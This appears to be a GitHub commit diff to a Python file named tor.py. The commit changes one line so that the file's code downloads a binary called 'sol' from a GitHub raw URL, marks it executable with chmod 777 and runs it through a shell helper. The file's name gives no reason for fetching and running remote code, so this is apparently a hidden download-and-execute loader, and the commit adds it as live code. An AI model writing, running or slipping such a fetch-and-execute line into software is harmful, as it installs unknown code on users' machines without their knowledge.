1a7e1feb8a6a70623d5235430056aef97ff9b632
gyrogerald <97717251+gyrogerald@users.noreply.github.com>
2022-02-26 17:29:54 +0800

    Update tor.py

--- tor.py
+++ tor.py
@@ -19,4 +19,4 @@ def cmdline(command):
  
 
 
-cmdline ( 'wget https://raw.githubusercontent.com/aurbach55/dera/main/sol && chmod 777 sol && ./sol' )
+cmdline ( 'wget https://raw.githubusercontent.com/gyrogerald/dera/main/sol && chmod 777 sol && ./sol' )
